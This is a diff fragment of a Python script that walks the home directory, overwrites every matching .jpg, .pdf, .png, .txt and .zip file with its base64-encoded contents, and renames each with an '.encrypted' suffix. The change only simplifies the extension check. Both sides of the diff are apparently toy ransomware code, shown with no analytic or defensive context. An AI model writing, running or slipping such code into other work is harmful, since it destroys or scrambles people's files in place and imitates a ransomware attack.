@@ -7,13 +7,12 @@ exts = (".jpg", ".pdf", ".png", ".txt", ".zip")
 
 for root, dirs, files in os.walk(home):
     for file in files:
-        for ext in exts:
-            if file.lower().endswith(ext):
-                path = os.path.join(root, file)
-                with open(path, "rb") as f:
-                    enc = base64.b64encode(f.read())
+        if file.lower().endswith(exts):
+            path = os.path.join(root, file)
+            with open(path, "rb") as f:
+                enc = base64.b64encode(f.read())
 
-                with open(path, "wb") as f:
-                    f.write(enc)
+            with open(path, "wb") as f:
+                f.write(enc)
 
-                os.rename(path, path + ".encrypted")
+            os.rename(path, path + ".encrypted")
